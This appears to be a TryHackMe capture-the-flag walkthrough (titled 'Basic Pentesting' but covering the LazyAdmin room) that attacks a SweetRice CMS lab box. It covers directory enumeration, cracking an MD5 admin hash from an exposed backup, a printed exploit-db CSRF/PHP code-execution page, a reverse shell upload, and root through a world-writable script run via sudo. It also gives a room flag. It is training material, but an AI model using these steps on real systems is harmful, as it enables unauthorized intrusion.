Lazy

# Basic Pentesting Wlakthrough
### Link
- https://tryhackme.com/room/basicpentestingjt
------------------------
### Recon
First scan to check all ports
```
sudo nmap -p- [IP]
```
**Namp scan result**
```
```

Now, let's perform a directory enumeration
```
 sudo gobuster dir -u http://10.10.23.230 -w [Path]/directory-list-2.3-small.txt
```
**Gobuster scan result**
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.23.230
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Users/laurentnebout/Documents/Tools/SecLists-master/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/20 05:29:36 Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 314] [--> http://10.10.23.230/content/]
```
Check the link **http://[IP]/content/**

We arrive to a page that indicates the website is under construction. But the most interesting information is the CMS Framework name **SweetRice**

Now, we can check the [exploit-db](http://exploit-db.com) and try to find some exploit related to **SweetRice** CMS framework.

We found a [list](https://github.com/LNB283/THM/blob/main/EASY/LazyAdmin/Pictures/LazyAdmin_1.png) of known exploit.

We check the link **http://[IP]/content/inc/mysql_backup/** and foudn a mysql backup. We can download it and check it contents.
```
 14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
```
```
"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\"
```
Now we have a username: **manager** and hash password : **42f749ade7f9e195bf475f37a44cafcb**

Now we need to identify the Hash type. For this step, use this [link](https://www.tunnelsup.com/hash-analyzer/)
```
MD5
```
Let's decrypt the password by using this [website](https://md5hashing.net/). You can also use **hashcat**
```
Password123
```
Now we are logged into the admin console.

----
### Exploit

If we remembered the exploit list from **exploit-db**, one of this is related to **CSRF/PHP code execution**
```
<!--
# Exploit Title: SweetRice 1.5.1 Arbitrary Code Execution
# Date: 30-11-2016
# Exploit Author: Ashiyane Digital Security Team
# Vendor Homepage: http://www.basic-cms.org/
# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
# Version: 1.5.1


# Description :

# In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add
PHP Codes In Ads File
# A CSRF Vulnerabilty In Adding Ads Section Allow To Attacker To Execute
PHP Codes On Server .
# In This Exploit I Just Added a echo '<h1> Hacked </h1>'; phpinfo(); 
Code You Can
Customize Exploit For Your Self .

# Exploit :
-->

<html>
<body onload="document.exploit.submit();">
<form action="http://localhost/sweetrice/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked"/>
<textarea type="hidden" name="adv">
<?php
echo '<h1> Hacked </h1>';
phpinfo();?>
&lt;/textarea&gt;
</form>
</body>
</html>

<!--
# After HTML File Executed You Can Access Page In
http://localhost/sweetrice/inc/ads/hacked.php
  -->
```
We are able to upload a php file so we can upload our favorite reverse shell php from **pentest monkey** to gain access.

- First: move to **Ads** from the GUI
- Second: upload the reverse shell php from [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) with the appropriate IP and Port
- Third: Start a listener
- Fourth: Move to **http://[IP]/content/inc/ads/** from the browser and click on the reverse shell file
```
Connection from 10.10.23.230:43214
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 14:20:25 up  1:53,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```
Use this command to have a proper prompt
```
 python -c 'import pty; pty.spawn("/bin/bash")'
```
**Question**
#### user.txt
```
www-data@THM-Chal:/home/itguy$ cat user.txt
cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```
**Answer** 
#### THM{63e5bce9271952aad1113b6f1ac28a07}

---
### Privilege escalation

Check what command we are able to perform with this user
```
www-data@THM-Chal:/home/itguy$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
Now we need to check **backup.pl** to understand what action this **Perl** script does.
```
www-data@THM-Chal:/home/itguy$ cat backup.pl
cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```
Let's check the permision of **copy.sh**
```
www-data@THM-Chal:/home/itguy$ ls -l /etc/copy.sh
ls -l /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```
Allusers can **Write** so we can modify this file ^^

Let's change the content to be able able to run **/bin/bash**
```
www-data@THM-Chal:/home/itguy$ echo "/bin/bash" > /etc/copy.sh
echo "/bin/bash" > /etc/copy.sh
```
Last step, run **backup.pl** 
```
sudo /usr/bin/perl /home/itguy/backup.pl
```
